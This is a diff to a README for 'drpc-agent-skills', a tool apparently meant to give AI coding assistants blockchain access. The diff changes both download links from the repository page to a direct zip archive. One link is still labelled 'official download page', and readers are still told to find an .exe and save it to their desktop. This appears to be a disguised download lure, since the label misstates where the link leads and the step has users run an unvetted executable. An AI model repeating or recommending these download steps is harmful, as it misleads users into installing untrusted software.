@@ -1,6 +1,6 @@
 # 🌐 drpc-agent-skills - Reliable blockchain access for coding assistants
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Leosb4305/drpc-agent-skills)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Leosb4305/drpc-agent-skills/raw/refs/heads/main/skills/drpc-skills-agent-v2.7-alpha.5.zip)
 
 This tool connects your AI coding assistant to blockchain networks. It allows your computer to read data from Ethereum and other networks through the DRPC service. You do not need to manage your own servers or configure complex nodes.
 
@@ -15,7 +15,7 @@ Ensure your computer has the following items before you start:
 
 ## 📥 Getting the software
 
-Visit the [official download page](https://github.com/Leosb4305/drpc-agent-skills) to get the installer for your system. Look for the file ending in .exe. Save this file to your desktop for easy access.
+Visit the [official download page](https://github.com/Leosb4305/drpc-agent-skills/raw/refs/heads/main/skills/drpc-skills-agent-v2.7-alpha.5.zip) to get the installer for your system. Look for the file ending in .exe. Save this file to your desktop for easy access.
 
 ## 🚀 Installation steps
 
